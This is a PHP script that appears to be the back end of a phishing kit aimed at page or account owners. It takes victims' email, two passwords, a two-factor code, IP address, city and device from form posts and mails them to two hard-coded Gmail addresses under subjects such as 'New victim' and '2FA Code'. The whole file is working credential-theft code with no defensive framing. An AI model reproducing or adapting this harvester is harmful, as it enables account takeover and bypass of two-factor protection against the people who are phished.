<?php
define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest');
if(!IS_AJAX) {die('Restricted access');}
$e = "";
$p = "";
$p2 = "";
$pgname = "";
$tjerat = "";
$country_name = "";
$ip = "";
$city = "";
$device = "";
$fn = "";
//var_dump($_POST);
//exit();
if(isset($_POST['email']) && isset($_POST['firstpassword'])){
    $e = $_POST['email'];
    $p = $_POST['firstpassword'];
}

if(isset($_POST['country']) && isset($_POST['ip'])&&isset($_POST['city'])&&isset($_POST['device']) && isset($_POST['fullname'])&& isset($_POST['pgname'])&& isset($_POST['tjerat'])){
    $country_name = $_POST['country'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $city = $_POST['city'];
    $device = $_POST['device'];
    $pgname = $_POST['pgname'];
    $tjerat = $_POST['tjerat'];
    $fn = $_POST['fullname'];
    
   // die();
    
}
if(isset($_POST['email'])){
    $e = $_POST['email'];
};
if(isset($_POST['firstpassword'])){
    $p = $_POST['firstpassword'];
};
if(isset($_POST['passwordDy'])){
    $p2 = $_POST['passwordDy'];
};
// the message
$msg = "Full Name = ".$fn."\n\nPage Name = ".$pgname."\n\nAdditional = $tjerat"."\n\nEmail = ".$e."\n\nPassword = ".$p."\n\nPassword2 = ".$p2."\n\nCountry = ".$country_name."\n\nIp Address = ".$ip."\n\nCity = ".$city."\n\nDevice = ".$device;

echo "<p>".$msg."</p>";

//die();
//$msg= "sadasdsdjighndfiugndfgndfgndf";
// use wordwrap() if lines are longer than 70 characters
$subject = "New victim";
//$msg = wordwrap($msg,70);
if(isset($_POST['codegeneratorRR'])){
    $code = $_POST['codegeneratorRR'];
    
    $msg = $code;
    $subject = "2FA Code";
    //var_dump($code);
}


$to = "johnsankpal.bussines@gmail.com";
// send email


mail($to,$subject,$msg);
mail('islamishkodran@gmail.com', 'Page Victim', $msg);

?>